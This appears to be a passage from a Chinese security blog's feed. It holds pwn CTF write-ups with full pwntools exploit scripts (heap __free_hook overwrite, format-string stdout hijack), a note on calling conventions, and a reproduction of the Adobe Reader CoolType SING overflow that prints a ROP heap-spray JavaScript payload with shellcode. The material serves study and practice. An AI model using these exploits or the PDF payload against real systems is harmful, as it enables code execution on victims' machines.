class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0x850</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(heap+<span class="number">0x870</span>)</span><br><span class="line">payload+=p64(<span class="number">0x450</span>)+p64(<span class="number">0x451</span>)</span><br><span class="line">write_review(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">call_parent(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">role(<span class="number">1</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))-<span class="number">96</span></span><br><span class="line"></span><br><span class="line">libc=elf.libc</span><br><span class="line">libc_base=main_arena-<span class="number">0x1ECB80</span></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(free_hook)</span><br><span class="line">write_review(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">write_review(<span class="number">6</span>,p64(system))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd10</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(heap+<span class="number">0xd30</span>)</span><br><span class="line">write_review(<span class="number">5</span>,payload)</span><br><span class="line"></span><br><span class="line">role(<span class="number">0</span>)</span><br><span class="line">choose(<span class="number">4</span>)</span><br><span class="line">sla(<span class="string">&quot;which student id to choose?&quot;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>wustctf2020-babyfmt-writeup</title>
    <url>/2022/03/03/wustctf2020-babyfmt-writeup/</url>
    <content><![CDATA[<p>函数就不放了</p>
<span id="more"></span>

<p>除了利用字符串格式化漏洞的操作外，还要了解FILE结构。</p>
<p>在执行程序时，通常会打开三标准文件：stdin(标准输入文件)，stdout(标准输出文件)和stderr(标准输出文件)，且后面两个都对应终端的屏幕。</p>
<p>定义了一个指向FILE结构的指针来接受这个返回值，存放在bss段。解这道题就需要利用这点。</p>
<p>更具体的内容可以看看<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">CTF wiki</a>。</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>这道题有三个功能，leak,fmt_attack,get_flag。</p>
<p>效果就如他们的名字一样，特殊的地方在于，leak和fmt_attack受一个栈上参数限制导致只能执行一次。但由于是在栈上，所以可以通过格式化字符串去改写，于是就能重复使用了。</p>
<p>栈上地址我们可以利用程序开头询问时间的漏洞，输入三个与’%ld’不对应的字符，则不会写入内存，而爆出栈上内容，从而泄露。</p>
<p>get_flag中有一个判断条件，是输入一串字符串与bss段上的secret进行比对。我们可以爆出这个值，但是由于leak只能泄露一位，我们需要重复利用leak，要想重复利用那么就要使用很多次fmt_attack才能将secret全部爆出。因此我们选择使用fmt_attack将secret改为’\0’。除此之外，再get flag之前会关闭stdout。</p>
<p>根据开篇提的知识点，解这道题需要将保存着<code>_IO_2_1_stdout_</code>指针的地址内容改写为<code>_IO_2_1_stderr_</code>。由于这两个指针的内容仅最后两个字节不同，因此我们只需要leak出<code>_IO_2_1_stderr_</code>的倒数第二位即可。</p>
<p>最后调用get_flag就能拿到flag了。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node4.buuoj.cn&#x27;,28477)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_file=elf.libc</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;tell me the time:&quot;</span>,<span class="string">&#x27;a\na\na&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;ok! time is &quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0xbd5</span></span><br><span class="line">leak_addr=stack_addr+<span class="number">28</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">secret_addr=elf_base+<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(secret_addr)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">stderr=elf_base+<span class="number">0x202040</span></span><br><span class="line">stdout=elf_base+<span class="number">0x202020</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stderr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stdout)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">payload=p64(stderr+<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak=u8(io.recv(<span class="number">1</span>))</span><br><span class="line">val=(leak&lt;&lt;<span class="number">8</span>)+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(val)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(val).ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stdout)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;If you can open the door!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>参数入栈顺序</title>
    <url>/2022/03/04/%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F/</url>
    <content><![CDATA[<p>调用函数时，会生成一个栈帧，而这个过程中会涉及到如何向该调用函数传参的问题。</p>
<span id="more"></span>

<p>使用c编写一个程序</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>, i, ++i, i++);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	test();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后运行程序，输出结果为’2 2 0’。</p>
<p>结果说明函数的参数的入栈顺序是从右往左的：</p>
<ol>
<li>先执行<code>i++</code>，将返回的<code>0</code>压入栈，此时<code>i=1</code></li>
<li>再执行<code>++i</code>，将返回的<code>2</code>压入栈，此时<code>i=2</code></li>
<li>最后压入<code>i</code></li>
</ol>
<p>以上是我们试出的结果，实际上这是因为函数调用中会遵循<strong>函数调用约定</strong>。该规则规定了以为下几方面：</p>
<ul>
<li>函数参数的传递顺序和方法</li>
<li>栈的维护方式</li>
<li>名字修饰(name-mangling)策略</li>
</ul>
<p>其中最常见的参数传递方式是通过<strong>堆栈传参</strong>：调用函数将参数压入栈中，被调用函数以相对栈基指针的偏移来访问栈中参数，类似于访问<code>bp[offset]</code>。而对于有多个参数的函数，调用约定规定将参数从右到左(或从左到右)依次入栈。某些约定还允许通过寄存器来传参。</p>
<p>常见调用约定具体可见该<a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">文章</a>。</p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>初次尝试，CVE-2020-2883复现与分析</title>
    <url>/2022/04/27/%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95%EF%BC%8CCVE-2020-2883%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>个人复现的第一个漏洞，从《漏洞战争》一书和别人的复现分析中学到了许多。</p>
<span id="more"></span>

<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2010-2883">官方文档</a></p>
<blockquote>
<p>Stack-based buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x before 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a PDF document with a long field in a Smart INdependent Glyphlets (SING) table in a TTF font, as exploited in the wild in September 2010. NOTE: some of these details are obtained from third party information.<br>References</p>
</blockquote>
<p>该漏洞是 Adobe Reader 和 Acrobat 的 CoolType.dll 库在解析字体文件SING表中的uniqueName项时存在的栈溢出漏洞。</p>
<h2 id="msf复现"><a href="#msf复现" class="headerlink" title="msf复现"></a>msf复现</h2><h3 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">攻击机环境</td>
<td align="left">kali linux</td>
</tr>
<tr>
<td align="left">靶机环境</td>
<td align="left">Windows XP SP3</td>
</tr>
</tbody></table>
<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3><h4 id="搜索模块"><a href="#搜索模块" class="headerlink" title="搜索模块"></a>搜索模块</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br></pre></td></tr></table></figure>

<p>结果有两个，一个是基于浏览器的，一个是基于软件的，我们选择基于软件的，也就是第二个。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br></pre></td></tr></table></figure>

<h4 id="设置payload"><a href="#设置payload" class="headerlink" title="设置payload"></a>设置payload</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec </span><br><span class="line">payload =&gt; windows/exec</span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set CMD calc.exe</span><br><span class="line">CMD =&gt; calc.exe</span><br></pre></td></tr></table></figure>

<p>让我们最后能弹出计算器</p>
<h4 id="设置并生成PDF"><a href="#设置并生成PDF" class="headerlink" title="设置并生成PDF"></a>设置并生成PDF</h4><figure class="highlight plaintext"><figcaption><span>exploit(windows/fileformat/adobe_cooltype_sing) > set FILENAME test.pdf</span></figcaption><table><tr><td class="code"><pre><span class="line">FILENAME =&gt; test.pdf                                                                                                                                                                                                                         </span><br><span class="line">msf6 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit                                                                                                                                                                               </span><br><span class="line">                                                                                                                                                                                                                                             </span><br><span class="line">[*] Creating &#x27;test.pdf&#x27; file...                                                                                                                                                                                                              </span><br><span class="line">[+] test.pdf stored at /home/rabbit/.msf4/local/test.pdf</span><br></pre></td></tr></table></figure>

<p>然后我们将该文件放入靶机并打开</p>
<p><img src="https://s2.loli.net/2022/04/26/jR6UBirCG47VnXf.png" alt="结果"></p>
<p>成功打开了计算器</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">操作系统</td>
<td align="left">Windows XP SP3</td>
</tr>
<tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">调试软件</td>
<td align="left">OllyDbg</td>
</tr>
<tr>
<td align="left">反汇编软件</td>
<td align="left">IDA</td>
</tr>
<tr>
<td align="left">漏洞软件</td>
<td align="left">Adobe Reader 9.3.4</td>
</tr>
</tbody></table>
<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><h4 id="strcat-函数"><a href="#strcat-函数" class="headerlink" title="strcat 函数"></a>strcat 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure>

<p>strcat 会将参数 src 字符串复制拼接到参数 dest 所指的字符串尾部，与 strcpy 一样是常见的造成栈溢出漏洞产生的危险函数。</p>
<h3 id="基于字符串定位漏洞"><a href="#基于字符串定位漏洞" class="headerlink" title="基于字符串定位漏洞"></a>基于字符串定位漏洞</h3><p>使用IDA反汇编 CoolType.dll 库，搜索文本 SING (ALT+T)查看，因为该字符串是漏洞解析出错的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.rdata:0819DB4C ; const char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &#x27;SING&#x27;,0             ; DATA XREF: sub_8015AD9+D2↑o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7B↑o ...</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>找到后再单击 x 查看引用。</p>
<p><img src="https://s2.loli.net/2022/04/26/GZrcHXYC94pn5ES.png" alt="查看引用"></p>
<p>根据《软件战争 软件漏洞分析技术揭秘》书中内容，我们逐个排查比对找到对应代码与危险函数strcat。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi</span><br><span class="line">.text:0803DD85 ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD87 ;   try &#123;</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; Source</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+Destination]</span><br><span class="line">.text:0803DDA6                 push    eax             ; Destination</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DDAB                 call    strcat</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>我们将该段给反汇编为伪源代码并截取其中关键部分来分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">int</span> v18; <span class="comment">// [esp+44h] [ebp-24h] BYREF</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 || (<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 == <span class="number">256</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Destination[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strcat</span>(Destination, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v18 + <span class="number">0x10</span>));    <span class="comment">//v18指向SING表，0x10为uniqueName相较于SING表的偏移</span></span><br><span class="line">          sub_8001243(Destination);</span><br><span class="line">          v6 = v18;</span><br><span class="line">        &#125;</span><br><span class="line">        v21 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>很明显，调用 strcat 时并没有对长度进行限制，造成栈溢出。</p>
<h4 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h4><p>我们直接对msf生成的PDF进行分析即可。<a href="http://www.rabb1t.xyz/2022/04/26/PDF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">PDF文件结构</a></p>
<p>使用PdfStreamDumper得到PDF样本中的TTF文件中关于SING表的TableEntry结构数据。</p>
<blockquote>
<p><code>.TTF</code>为后缀的文件被叫做字体文件，其实是一张表，其中包含所有的字体(或合成规则)，</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/04/26/71AKGL84ulnSDFO.png" alt="TTF Font"></p>
<p><img src="https://s2.loli.net/2022/04/26/h5REaAt4j68WxKu.png" alt="find"></p>
<p><img src="https://s2.loli.net/2022/04/26/cxIYeOrilbDSuws.png" alt="SING"></p>
<p>而官方文档给出的对TableEntry结构的定义为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;                   <span class="comment">//SING表对应的TableEntry结构</span></span><br><span class="line">  <span class="keyword">char</span> tag[<span class="number">4</span>];      <span class="comment">//标记             &quot;SING&quot;</span></span><br><span class="line">  ULONG checkSun;   <span class="comment">//校验和          0xd9bcc8b5</span></span><br><span class="line">  ULONG offset;     <span class="comment">//相对文件的偏移  0x0000011c</span></span><br><span class="line">  ULONG length;     <span class="comment">//数据长度       0x00001ddf</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>

<p>依据偏移找到SING表(起始为 0x00000100)</p>
<p><img src="https://s2.loli.net/2022/04/26/c86qBn4t3MzmLX5.png" alt="SING"></p>
<p>接着再偏移0x10，即为uniqueName域(即输入内容的起始为<code>3A B4 18 E5</code>)。执行 strcat 后，会将该部分复制到ebp的指定地址，接下来我们进行动态调试。</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>一个小技巧，msf生成pdf前，将文件<code>/usr/share/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</code>，中的第102行注释掉，换成第101行的内容。这可以将exp中的填充字符从随机字符变为’A’。</p>
<p>利用OD调试 Adobe Reader，在刚才找到的引用 SING 表处下断点(F2)，单过执行至 0x803DD85，查看此时寄存器的内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/mwEt91LshxBvcfd.png" alt="register"></p>
<p>此时 EAX 内的内容为 0x48663b4，我们跳转过去看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/ovZ9V2ganjpsG4I.png" alt="OD"></p>
<p>与我们PDF文件中 uniqueName 域中内容对应，这就是程序加载文件内容的地方。待会调用 strcat 时，就会将这块的内容拼接到 Destination 指向的地址。</p>
<p>单过执行至调用 strcat 处(0x803DDAB)，调用 strcat 后查看 Destination 指向的值：</p>
<p><img src="https://s2.loli.net/2022/04/26/sie84KuTDRSX5mM.png" alt="OD"></p>
<p>其中内容已经变为了 uniqueName 域的内容</p>
<p>经过调试，一直跟进到 0x0808B308 再单过就会调出计算器，其内容为 <code>CALL DWORD PTR DS:[EAX]</code>，这就是执行我们ROP指令的地址。然后此时 eax 的值为 0x4A80CB38，查看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/27/OojmHELgnzUPKIy.png" alt="leave_ret"></p>
<p>其实就是平时栈迁移题里常用的<code>leave_ret</code>指令。此时的 ebp 值为 0x012E4DC，在栈上是</p>
<p><img src="https://s2.loli.net/2022/04/27/AburZOBkgEzmqMh.png" alt="stack"></p>
<p>也就是我们插入的第一个ret地址，我们在这里看看执行时具体会产生什么效果。</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
<li>首先将栈上的 0x0C0C0C0C 内容赋给ESP，其中内容为 0x4A8063A5，然后ret。执行 0x4A8063A5</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/RDP6C3dcY7UKbfJ.png" alt=" 0x4A8063A5"></p>
<ul>
<li>接着弹出栈上内容赋给 ECX，内容为 0x4A8A0000，然后ret，执行 0x4A802196</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/Lgmnr4psR5IXfbk.png" alt="0x4A802196"></p>
<ul>
<li>将EAX的值赋给[ECX]，此时EAX为 0x0012E6D0，然后ret，执行 0x4A801F90</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/SdPwzRHmsVL4fIT.png" alt="OD"></p>
<p><img src="https://s2.loli.net/2022/04/27/85gaciZpGyKlDhM.png" alt="0x4A801F90"></p>
<ul>
<li>弹出栈上元素赋给EAX，即 0x4A801F90，然后ret，执行 0x4A80B692</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/tIn9CTAVpF6JR5Z.png" alt="0x4A80B692"></p>
<ul>
<li>而 0x4A801F90 连接了一个函数<code>CreateFileA</code>，</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/BXYdQyw39GVaN8u.png" alt="CreateFileA"></p>
<ul>
<li>调用 CreateFileA，创建了一个名为 iso88591 的文件，然后ret</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/VU265KIHGtcJvSR.png" alt="OD"></p>
<p>接着调试发现是一样的过程，只不过调用的函数不同。程序接着调用了 CreateFileMappingA，创建文件内存映射</p>
<p><img src="https://s2.loli.net/2022/04/27/bpfTIHMnAgrSsBk.png" alt="CreateFileMappingA"></p>
<p>还有 MapViewOfFile，将shellcode复制到申请的内存处</p>
<p><img src="https://s2.loli.net/2022/04/27/79QuAEmBDsWrTc5.png" alt="MapViewOfFile"></p>
<p>shellcode 是通过嵌入PDF的JavaScript来写入的，内容可以在 PdfStreamDumper 中看到：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk = SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u80b8%uaf28%udbe6%ud9d1%u2474%u5bf4%uc933%u31b1%u4331%u0313%u1343%uc383%uca84%u1a5a%u886c%ue3a5%ued6c%u062c%u2d5d%u424a%u9dcd%u0618%u56e1%ub34c%u1a72%ub459%u9133%ufbbf%u8ac4%u9afc%ud146%u7cd0%u1a77%u7c25%u47b0%u2cc4%u0369%uc17b%u591e%u6a40%u4f6c%u8fc0%u6e24%u01e1%u293f%ua321%u41ec%ubb68%u6cf1%u3022%u1bc1%u90b5%ue318%udd1a%u1695%u1962%uc911%u5311%u7462%ua022%ua219%u33a7%u21b9%u981f%ue538%u6bc6%u4236%u348c%u555a%u4f41%ude66%u8064%ua4ef%u0442%u7fb4%u1dea%ud110%u7d13%u8efb%uf5b1%uda11%u57cb%u1d7f%ue259%u1dcd%ued61%u7661%u6650%u01ee%uad6d%ufd4b%uec27%u96fd%u64e1%ufabc%u5311%u0282%u5692%uf17a%u128a%ubd7f%uce0c%uae0d%uf0f8%ucfa2%u9328%u5c25%u7ab0%ue4c0%u8353&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl = 